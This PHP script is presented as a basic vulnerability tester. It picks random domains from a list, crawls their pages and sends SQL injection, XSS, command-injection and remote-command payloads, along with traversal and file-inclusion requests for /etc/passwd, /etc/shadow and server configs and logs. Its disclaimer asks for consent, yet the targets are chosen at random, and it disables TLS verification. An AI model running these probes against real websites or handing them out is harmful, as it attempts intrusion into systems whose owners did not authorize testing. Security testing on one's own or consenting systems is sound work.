<?php

// ***** DISCLAIMER ***** //
// this is a very basic vulnerability tester I've quickly built.
// it workd by providing a domain list txt file with a domain in evey newline in the following format
// domain_name.domain_extension
// be sure to use it only on websites that agrees on crawling policies and vulnerability testing
// it uses cURL, mb_string and openssl extensions
// ***** DISCLAIMER ***** //

// Define ANSI escape codes for text colors as global variables
$red = "\033[0;31m";
$green = "\033[0;32m";
$reset = "\033[0m";

// number of random domain to test
$how_many = 3;
$websites = file("websites.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

function generateRandomWebsites(){
    global $websites;
    $rand = array_rand($websites);
    $website = $websites[$rand];
    $domainURL = "https://www.$website";
    array_splice($websites, $rand, 1);
    return $domainURL;
}

function curlRequest($url, $timeout = 1) {
    $ch = curl_init($url);

    // Set cURL options
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Disable SSL certificate verification

    $response = curl_exec($ch);

    // Get HTTP response code
    $response_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return [$response, $response_code];
}

function domainExists($url, $timeout = 1) {
    list($response, $response_code) = curlRequest($url, $timeout);
    return $response_code == 200;
}

function checkSQLInjection($url) {
    global $red, $green, $reset;
    // Check for SQL injection vulnerability
    $test_url = $url . "' OR '1'='1";
    list($response, $response_code) = curlRequest($test_url);

    if (strpos($response, "SQL syntax") !== false) {
        echo "{$green}SQL Injection Vulnerability Found!\n";
    } else {
        echo "{$red}No SQL Injection Vulnerability Found.\n";
    }
    echo "{$reset}";
}

function checkXSS($url) {
    global $red, $green, $reset;
    // Check for Cross-Site Scripting (XSS) vulnerability
    $payloads = [
        "<script>alert('XSS')</script>",
        "<IMG SRC=j&#X41vascript:alert('XSS')>",
        "%3Cscript%3Ealert('XSS')%3C/script%3E" // URL encoded
        // Add more payloads with different variations and encodings
    ];

    foreach ($payloads as $payload) {
        $test_url = $url . "/?q=" . urlencode($payload);
        list($response, $response_code) = curlRequest($test_url);

        // Check if any of the payloads are executed in the response
        if (strpos($response, $payload) !== false) {
            echo "{$green}XSS Vulnerability Found!\n";
            return;
        }
    }

    echo "{$red}No XSS Vulnerability Found.\n";
    echo "{$reset}";
}


function checkRCE($url) {
    global $red, $green, $reset;
    // Check for Remote Code Execution (RCE) vulnerability
    // Note: This is a simple example and may not cover all cases
    $test_command = "echo 'Test RCE'";
    $test_url = $url . "/?cmd=" . urlencode($test_command);
    list($response, $response_code) = curlRequest($test_url);

    if (strpos($response, "Test RCE") !== false) {
        echo "{$green}RCE Vulnerability Found!\n";
    } else {
        echo "{$red}No RCE Vulnerability Found.\n";
    }
    echo "{$reset}";
}

function checkDirectoryTraversal($url) {
    global $red, $green, $reset;
    $test_paths = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/hosts.allow",
        "/etc/hosts.deny",
        "/etc/group",
        "/etc/resolv.conf",
        "/etc/ssh/sshd_config",
        "/etc/apache2/apache2.conf",
        "/etc/nginx/nginx.conf",
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "/var/log/syslog",
        "/var/log/messages"
    ];

    foreach ($test_paths as $test_path) {
        $test_url = $url . "/../.." . $test_path;
        list($response, $response_code) = curlRequest($test_url);

        // Check if response contains expected content indicating access to system file
        if ($response_code == 200 && strpos($response, "<html>") === false) {
            echo "{$green}Directory Traversal Vulnerability Found! Accessed: $test_path\n";
            return;
        }
    }

    // If none of the expected system files were accessed, no vulnerability found
    echo "{$red}No Directory Traversal Vulnerability Found.{$reset}\n";
}

function checkFileInclusion($url) {
    global $red, $green, $reset;
    // Check for File Inclusion vulnerability
    $test_url = $url . "?file=../../../../etc/passwd";
    list($response, $response_code) = curlRequest($test_url);

    if (strpos($response, "root:") !== false) {
        echo "{$green}File Inclusion Vulnerability Found!\n";
    } else {
        echo "{$red}No File Inclusion Vulnerability Found.\n";
    }
    echo "{$reset}";
}

function checkCommandInjection($url) {
    global $red, $green, $reset;
    // Check for Command Injection vulnerability
    $test_command = "ls /etc";
    $test_url = $url . "?cmd=" . urlencode($test_command);
    list($response, $response_code) = curlRequest($test_url);

    if (strpos($response, "passwd") !== false) {
        echo "{$green}Command Injection Vulnerability Found!\n";
    } else {
        echo "{$red}No Command Injection Vulnerability Found.\n";
    }
    echo "{$reset}";
}

function testPageVulnerabilities($url) {
    echo "Testing vulnerabilities for: $url\n";
    checkSQLInjection($url);
    checkXSS($url);
    checkRCE($url);
    checkDirectoryTraversal($url);
    checkFileInclusion($url);
    checkCommandInjection($url);
    echo "------------------------------\n";
}

function getBaseDomain($url) {
    // Extract base domain from URL
    $parsed_url = parse_url($url);
    return $parsed_url['scheme'] . '://' . $parsed_url['host'];
}

function testWebsiteVulnerabilities($website) {
    $homepage_url = $website;
    $base_domain = getBaseDomain($homepage_url);
    $homepage = curlRequest($homepage_url);

    if ($homepage[1] == 200) {
        testPageVulnerabilities($homepage_url, $base_domain);

        // Extract links from the homepage and test vulnerabilities on each page
        preg_match_all('/<a\s+(?:[^>]*?\s+)?href="([^"]*)"/i', $homepage[0], $matches);
        $links = $matches[1];

        foreach ($links as $link) {
            // Parse the link URL
            $parsed_link = parse_url($link);

            // Check if the link is a relative path
            if (!empty($parsed_link['path'])) {
                // Construct absolute URL based on base domain and relative path
                $absolute_url = rtrim($base_domain, '/') . $parsed_link['path'];
                testPageVulnerabilities($absolute_url, $base_domain);
            }
        }
    } else {
        echo "Failed to fetch homepage of $homepage_url\n";
    }
}

// Setting up $how_many existing domains
$existingDomains = [];
while ((count($existingDomains) < $how_many) && count($websites) > 0) {
    $url = generateRandomWebsites($websites);
    if (domainExists($url)) {
        $existingDomains[] = $url;
        echo "\nadding " . $url . " to list [".count($existingDomains)."/".$how_many."]";
    }
}

echo "\n------------------------------\n";

// Test vulnerabilities for each provided domain
foreach ($existingDomains as $url) {
    testWebsiteVulnerabilities($url);
}

?>
